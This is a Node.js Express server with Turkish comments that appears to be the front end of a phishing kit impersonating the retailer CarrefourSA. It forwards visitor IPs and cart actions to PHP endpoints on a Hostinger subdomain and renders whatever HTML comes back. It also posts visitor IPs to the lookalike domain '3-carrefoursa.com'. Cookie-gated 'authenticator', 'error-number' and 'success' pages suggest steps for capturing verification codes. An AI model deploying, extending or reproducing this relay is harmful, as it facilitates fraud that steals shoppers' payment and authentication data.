const express = require('express');
const axios = require('axios');
const cookieParser = require('cookie-parser');
const path = require('path');
const requestIp = require('request-ip');
const cors = require('cors');
const qs = require('querystring');

require('dotenv').config();

const app = express();
app.use(cookieParser());
app.use(requestIp.mw());
const port = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

 
app.use(express.static(path.join(__dirname, 'public')));

 app.use(cors());


app.get('/', async (req, res) => {
  try {
    const clientIp =
      req.headers['x-forwarded-for']?.split(',')[0] ||
      req.connection.remoteAddress ||
      req.socket.remoteAddress ||
      req.ip;

    const response = await axios.post(
      'https://forestgreen-rook-759809.hostingersite.com/dmn/index.php',
      qs.stringify({ ip: clientIp }),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        }
      }
    );

    const html = response.data;
    res.send(html);
  } catch (error) {
    console.error('Veri çekme hatası:', error.message);
    res.status(500).send('Sunucudan veri alınamadı.');
  }
});


app.post('/veri', async (req, res) => {
  try {
    // Ziyaretçi IP'sini al
    const clientIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

    // PHP sunucuya yönlendir
    const response = await axios.post(`https://forestgreen-rook-759809.hostingersite.com/dmn/veri.php?ip=${clientIp}`);

    // PHP cevabını geri döndür
    res.send(response.data);
  } catch (error) {
    console.error('PHP sunucusuna bağlanılamadı:', error.message);
    res.status(500).send('sunucu_hatasi');
  }
});



app.post('/api/sepet/ekle', (req, res) => {
  const urun_id = req.body.urun_id;

  const getClientIp = (req) => {
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
      return forwarded.split(',')[0].trim();
    }
    return req.connection.remoteAddress?.replace('::ffff:', '') || '127.0.0.1';
  };

  const clientIp = getClientIp(req);

  axios.post('https://forestgreen-rook-759809.hostingersite.com/dmn/request.php',
    qs.stringify({
      action: 'sepet_ekle',
      urun_id,
      ip: clientIp
    }), {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest'
      }
    }
  ).then(response => {
    res.json({ status: response.data.trim() });
  }).catch(error => {
    console.error(error);
    res.json({ status: 'fail' });
  });
});

app.post('/api/sepet/sil', (req, res) => {
   const urun_id = req.body.urun_id;
   const clientIp = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;

   axios.post('https://forestgreen-rook-759809.hostingersite.com/dmn/request.php?action=sepet_sil', {
      urun_id,
      ip: clientIp
   }).then(response => {
      res.json({ status: response.data });
   }).catch(error => {
      console.error(error);
      res.json({ status: 'fail' });
   });
});


app.get('/authenticator', (req, res) => {
     const caAsCookie = req.cookies.ca_as;
    if (!caAsCookie) {
        return res.redirect('/');
    }
    res.sendFile(path.join(__dirname, 'public', 'authenticator.html'));
   });
  app.get('/error-number', (req, res) => {
       const caAsCookie = req.cookies.ca_as;
    if (!caAsCookie) {
        return res.redirect('/');
    }
    res.sendFile(path.join(__dirname, 'public', 'error-number.html'));
  });
app.get('/successfuly', (req, res) => {
     const caAsCookie = req.cookies.ca_as;
    if (!caAsCookie) {
        return res.redirect('/');
    }
  res.sendFile(path.join(__dirname, 'public', 'basarili.html'));
});
  

 
app.post('/api', async (req, res) => {
  const clientIp = req.clientIp; // Ziyaretçinin IP adresi

  try {
    const response = await axios.post('http://3-carrefoursa.com', {
      ip: clientIp
    });

    
    res.send(response.data);
  } catch (error) {
    console.error("Hedef URL'ye POST gönderiminde hata:", error);
    res.status(500).send("Sunucu hatası, lütfen daha sonra tekrar deneyin.");
  }
});

 

  

app.listen(port, () => {
    console.log(`Web sunucusu http://localhost:${port} adresinde çalışıyor.`);
});
